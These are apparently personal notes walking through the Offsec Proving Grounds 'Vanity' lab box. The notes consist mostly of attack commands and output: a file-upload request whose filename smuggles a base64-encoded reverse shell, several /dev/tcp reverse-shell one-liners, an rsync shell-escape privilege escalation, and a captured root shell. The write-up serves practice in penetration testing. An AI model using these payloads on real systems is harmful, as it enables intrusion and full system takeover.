参考资料  
[https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Vanity.md](https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Vanity.md)
 
01数据包

![[Vanity image 25b06e2417386281.png|Exported image]]  

注意数据包的格式
   

攻击数据包  
POST /uploads/upload.php HTTP/1.1  
Host: 192.168.161.234  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Content-Type: multipart/form-data; boundary=---------------------------343494055620974095043599612657  
Content-Length: 230  
Origin: [http://192.168.161.234](http://192.168.161.234)  
Connection: close  
Referer: [http://192.168.161.234/](http://192.168.161.234/)  
Upgrade-Insecure-Requests: 1
   

-----------------------------343494055620974095043599612657  
Content-Disposition: form-data; name="file"; filename="shell.php; echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE2OC84MCAwPiYx | base64 -d | bash"  
Content-Type: application/x-php
   

-----------------------------343494055620974095043599612657
    
rustscan -a 192.168.161.234 -u 5000 -t 8000
   

rsync -av rsync://192.168.161.234:873/source/uploads/upload.php ./upload.php
    
第一个  
$ ls  
html  
local.txt  
pub  
$ cat local.txt  
99cf38794866ceecb8007c8e0c302a0f  
$
 
/bin/sh -i \>& /dev/tcp/192.168.45.168/1234 0\>&1
 
/usr/bin/rsync -e 'sh -p -c "/bin/sh -i \>& /dev/tcp/192.168.45.168/1234 0\>&1"' 127.0.0.1:/dev/null
    
echo "/bin/sh -i \>& /dev/tcp/192.168.45.168/873 0\>&1" \> root.sh
 
记得touch一下
   

┌──(kali㉿kali)-[~/Desktop/pg03/Vanity]  
└─$ rlwrap -cAr nc -nvlp873  
listening on [any] 873 ...  
connect to [192.168.45.168] from (UNKNOWN) [192.168.161.234] 60824  
/bin/sh: 0: can't access tty; job control turned off  
# whoami  
root  
# cd /root  
# ls  
passwd  
proof.txt  
snap  
# cat proof.txt  
e728436439958e63fade548f5a8dcf1c  
#